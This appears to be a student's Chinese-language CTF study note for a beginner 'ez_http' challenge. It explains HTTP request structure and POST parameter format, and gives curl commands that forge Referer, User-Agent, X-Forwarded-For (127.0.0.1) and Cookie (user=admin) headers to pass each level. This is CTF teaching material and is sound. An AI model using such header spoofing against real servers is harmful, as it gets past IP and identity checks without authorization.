# 🗂 Web 笔记 16｜HTTP 请求要素速查（请求头 / POST格式 / 伪造全家桶）

> 记录自：qsnctf ez_http 六连关 ｜ 2026-08-11 ｜ 学生踩坑后沉淀
> 适用：HTTP 基础题、任何需要改请求头 / 伪造身份的题
> 与笔记02 的关系：02 讲「参数怎么传」（GET/POST），本篇讲「请求整体长什么样 + 哪些要素可以伪造」

---

## 一、HTTP 请求长什么样（四段式，背下来）

```
POST /index.php HTTP/1.1                  ← ① 请求行：方法 + 路径 + 协议版本
Host: challenge.qsnctf.com:40073          ← ② 请求头：一行一个，格式【名: 值】
Referer: https://sqnu-tysec.com
User-Agent: TYsecBrowser
X-Forwarded-For: 127.0.0.1
Cookie: user=admin
                                          ← ③ 空行（分隔头与体，必须有！）
tyctf=x&hhh=abc                           ← ④ 请求体：POST 参数放这里
```

> 💡 请求头**没有固定数量**，可以加任意多个（服务器认识才有效）。
> 💡 Burp 里看原始请求就是这个样子；HackBar/curl 只是帮你拼这个格式。

---

## 二、请求头速查表（7 个可伪造要素 ★核心）

| # | 要素 | 记录什么 | 服务器拿它干嘛 | 题目里怎么伪造 |
|---|---|---|---|---|
| 1 | **请求方法** | GET / POST / 其他 | 判断动作类型 | 提示「use POST」→ 改 POST |
| 2 | **GET 参数** | URL 里 `?a=1&b=2` | 查询条件 | 加 `?参数=值` |
| 3 | **POST 参数** | body 里 `a=1&b=2` | 提交的数据 | body 写 `参数=值` |
| 4 | **Referer** | 你从哪个页面跳来的 | 校验来源（防盗链/CSRF） | `-H "Referer: https://xxx"` |
| 5 | **User-Agent** | 你用的什么浏览器 | 识别客户端 | `-H "User-Agent: TYsecBrowser"` |
| 6 | **X-Forwarded-For** | 你的真实 IP | 校验 IP（内网/本地判断） | `-H "X-Forwarded-For: 127.0.0.1"` |
| 7 | **Cookie** | 你的登录身份 | 判断你是谁/权限 | `-H "Cookie: user=admin"` |

**核心认知**：这 7 样全是客户端发出去的东西，**随便改**。服务器只要拿其中任何一个当「身份/权限/来源」的依据，就是漏洞。

---

## 三、POST 参数格式铁律（★★ 你踩的坑，重点）

```
tyctf=666&hhh=abc
```

| 规则 | 说明 | 反例 |
|---|---|---|
| 参数之间用 **`&`** | 一个参数一段，& 连接 | ❌ `tyctf=666;hhh=abc`（`;` 不是分隔符，会被当成 tyctf 的值的一部分） |
| 格式是 `名字=值` | 等号，**没有空格** | ❌ `tyctf = 666` |
| 名字必须和提示**一字不差** | 提示 `hhh = abc` 就写 `hhh=abc` | ❌ 写 `post=abc`（名字错了，服务器找不到 hhh） |
| 值必须精确匹配 | 大小写、内容都对 | ❌ `HHH=abc`、`hhh=ABC` |

> ⚠️ 命令行里 `;` 是「分隔两条命令」，但 **POST body 里 `&` 才是参数分隔符**——两个世界的规则别混。
> 💡 多个参数：`a=1&b=2&c=3`，永远 &。

---

## 四、curl 伪造每个要素（对照表）

```bash
# 改方法
curl -X POST URL

# GET 参数（直接在 URL 里）
curl "URL?a=1&b=2"

# POST 参数（-d，自动变 POST）
curl -X POST -d "a=1&b=2" URL

# 加请求头（-H，一个头一个 -H）
curl -H "Referer: https://sqnu-tysec.com" URL
curl -H "User-Agent: TYsecBrowser" URL
curl -H "X-Forwarded-For: 127.0.0.1" URL
curl -H "Cookie: user=admin" URL

# 全家桶一次来
curl -X POST -d "tyctf=x&hhh=abc" \
  -H "Referer: https://sqnu-tysec.com" \
  -H "User-Agent: TYsecBrowser" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "Cookie: user=admin" \
  http://challenge.qsnctf.com:40073/
```

---

## 五、ez_http 六连关实战（完整提示链）

| 关 | 页面提示 | 解法 |
|---|---|---|
| 1 | `Please use POST Method` | 改 POST |
| 2 | `请使用POST方法`（中文版=暗示带开关参数） | body 加 `tyctf=x`（值任意） |
| 3 | `POST to hhh = abc` | body 加 `hhh=abc` |
| 4 | `This page must be source https://sqnu-tysec.com` | `-H "Referer: https://sqnu-tysec.com"` |
| 5 | `你用的什么浏览器??? 是TYsecBrowser吗?` | `-H "User-Agent: TYsecBrowser"` |
| 6 | `你不是本地人!!!` | `-H "X-Forwarded-For: 127.0.0.1"` |
| 7 | `没带曲奇饼, 或user曲奇饼不是admin牌的` | `-H "Cookie: user=admin"` → flag |

> 提示细节会变的规律：**同一句话出现中/英两个版本 = 不是重复，是暗示你少了「开关参数」**（tyctf 不传时永远是中文版）。

---

## 六、速查卡（贴墙用）

```
POST 参数格式:  名字=值&名字=值&名字=值     （& 连接, 无空格, 名字值精确匹配）
改方法:        curl -X POST URL
加请求头:      curl -H "头名: 值" URL      （冒号+空格, 一个头一个 -H）
Referer:       -H "Referer: https://xxx"      （来源页）
User-Agent:    -H "User-Agent: 浏览器名"
X-Forwarded-For: -H "X-Forwarded-For: 127.0.0.1"   （伪造本地IP）
Cookie:        -H "Cookie: user=admin"          （身份）
7 个可伪造要素: 方法 / GET参数 / POST参数 / Referer / UA / XFF / Cookie
一句话:        服务器拿请求头当身份依据 = 全可伪造
```
